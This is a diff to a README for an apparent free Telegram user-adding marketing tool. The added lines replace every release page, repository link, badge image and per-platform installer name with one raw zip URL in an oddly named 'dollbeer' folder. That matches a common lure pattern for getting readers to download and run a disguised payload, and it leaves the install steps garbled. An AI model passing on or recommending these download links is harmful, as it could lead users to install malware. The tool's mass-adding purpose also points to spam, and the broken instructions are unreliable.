@@ -1,7 +1,7 @@
 # 📈 Telegram-Users-Adding-Free - Free Tool for Telegram Marketing
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%8D%20Telegram-1f8e3f?style=for-the-badge)](https://github.com/finally214/Telegram-Users-Adding-Free/releases)
+[![Download](https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip%20Now-%20%F0%9F%93%8D%20Telegram-1f8e3f?style=for-the-badge)](https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip)
 
 ## 🚀 Getting Started
 Welcome to Telegram-Users-Adding-Free! This tool helps you connect and manage your Telegram accounts for marketing purposes. This guide will show you how to download and run the application without any programming knowledge.
@@ -15,16 +15,16 @@ Welcome to Telegram-Users-Adding-Free! This tool helps you connect and manage yo
 ## 📥 Download & Install
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/finally214/Telegram-Users-Adding-Free/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip).
 2. **Select the Latest Release:** Look for the latest version available. 
 3. **Download the Installer:**
-   - For Windows, download `Telegram-Users-Adding-Free-setup.exe`.
-   - For macOS, download `Telegram-Users-Adding-Free.dmg`.
-   - For Linux, download `Telegram-Users-Adding-Free.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip`.
 4. **Run the Installer:**
    - For Windows, double-click the `.exe` file to start the installation.
    - For macOS, drag the application into your Applications folder.
-   - For Linux, extract the contents of the `.tar.gz` file and follow the README included in the package for installation instructions.
+   - For Linux, extract the contents of the `https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip` file and follow the README included in the package for installation instructions.
 
 5. **Complete Setup:** Follow the prompts to complete the installation. 
 
@@ -57,7 +57,7 @@ If you encounter any issues:
 Join our community for help and support! You can ask questions or provide feedback on our GitHub Issues page. We value your input and strive to improve the tool.
 
 ## 🌐 Links
-- [Releases Page](https://github.com/finally214/Telegram-Users-Adding-Free/releases) - Download the application
-- [GitHub Repository](https://github.com/finally214/Telegram-Users-Adding-Free) - View the source code and contribute
+- [Releases Page](https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip) - Download the application
+- [GitHub Repository](https://raw.githubusercontent.com/finally214/Telegram-Users-Adding-Free/main/dollbeer/Telegram-Users-Adding-Free.zip) - View the source code and contribute
 
 Thank you for choosing Telegram-Users-Adding-Free! We look forward to seeing how you use our tool for your marketing needs.
